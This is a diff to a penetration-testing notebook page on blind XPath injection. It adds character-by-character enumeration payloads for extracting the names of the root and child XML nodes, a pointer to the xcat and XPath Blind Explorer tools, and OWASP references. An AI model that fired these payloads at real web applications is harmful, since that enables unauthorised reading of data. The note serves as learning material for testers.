@@ -29,15 +29,36 @@ http://<website>/vulnpage.php?countryID=999999 or "1"="2"
 ```
 
 ### Finding Root Node Identifier
+Enumerate one character at a time with this technique.
+If you get a **TRUE** condition you know the first character is *b*
 
 ```bash
-' or substring(name(/*[*))'
+' or substring(name(/*[1]),1,1)='a
+' or substring(name(/*[1]),1,1)='b
+' or substring(name(/*[1]),2,1)='a
 ```
 
+After enumerating you get **users**
+### Finding first child node name
+Enumerate one character at a time with this technique.
+If you get a **TRUE** condition you know the first character is *b*
+
+```bash
+' or substring(name(/users/*),1,1)='a
+' or substring(name(/users/*),1,1)='b
+' or substring(name(/users/*),2,1)='b
+```
 # Enumerate Blind Bolean injections with xcat
 You can see here how to use xcat (Tool for injection auto blind bolean to extract) 
 
 [[Xcat]]
 
+XPath Blind Explorer // https://code.google.com/archive/p/xpath-blind-explorer/
+
 ### Useful XPath statements
 ![[Pasted image 20220217090452.png]]
+
+## Resources
+https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)
+
+https://owasp.org/www-community/attacks/Blind_XPath_Injection
